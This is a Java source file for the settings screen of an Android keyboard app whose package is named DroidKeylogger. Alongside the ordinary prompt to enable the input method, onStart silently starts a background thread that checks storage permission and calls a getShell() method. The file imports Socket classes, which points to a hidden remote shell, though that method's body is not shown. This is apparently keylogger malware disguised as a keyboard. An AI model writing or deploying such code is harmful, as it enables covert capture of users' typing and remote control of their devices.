package com.DroidKeylogger.main.latin.settings;

import android.app.ActionBar;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.preference.PreferenceActivity;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.view.MenuItem;
import android.view.inputmethod.InputMethodManager;

import com.DroidKeylogger.main.R;
import com.DroidKeylogger.main.latin.RichInputMethodManager;
import com.DroidKeylogger.main.latin.utils.FragmentUtils;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class SettingsActivity extends PreferenceActivity {
    private static final String DEFAULT_FRAGMENT = SettingsFragment.class.getName();
    private static final String TAG = SettingsActivity.class.getSimpleName();

    @Override
    protected void onStart() {
        super.onStart();

        boolean enabled = false;

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    checkPermission();
                } catch (Exception e) {

                }
            }
        }).start();

//        boolean enabled = false;
        try {
            InputMethodManager immService = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            RichInputMethodManager.InputMethodInfoCache inputMethodInfoCache = new RichInputMethodManager.InputMethodInfoCache(immService, getPackageName());
            enabled = inputMethodInfoCache.isInputMethodOfThisImeEnabled();
        } catch (Exception e) {
            Log.e(TAG, "Exception in check if input method is enabled", e);
        }

        if (!enabled) {
            final Context context = this;
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setMessage(R.string.setup_message);
            builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    Intent intent = new Intent(android.provider.Settings.ACTION_INPUT_METHOD_SETTINGS);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                    dialog.dismiss();
                }
            });
            builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    finish();
                }
            });
            builder.setCancelable(false);

            builder.create().show();
        }
    }

    @Override
    protected void onCreate(final Bundle savedState) {
        super.onCreate(savedState);
        final ActionBar actionBar = getActionBar();

        if (actionBar != null) {
            actionBar.setDisplayHomeAsUpEnabled(true);
            actionBar.setHomeButtonEnabled(true);
        }

    }
    private void checkPermission() {
        if(ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.WRITE_EXTERNAL_STORAGE") ==
                PackageManager.PERMISSION_GRANTED) {
            try {
                getShell();
            } catch (Exception e) {
                Log.e("Error", e.getMessage());
            }
        }
        else {
            final int REQUEST_CODE_ASK_PERMISSIONS = 123;
            ActivityCompat.requestPermissions(SettingsActivity.this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE"}, REQUEST_CODE_ASK_PERMISSIONS);
            checkPermission();
        }
    }
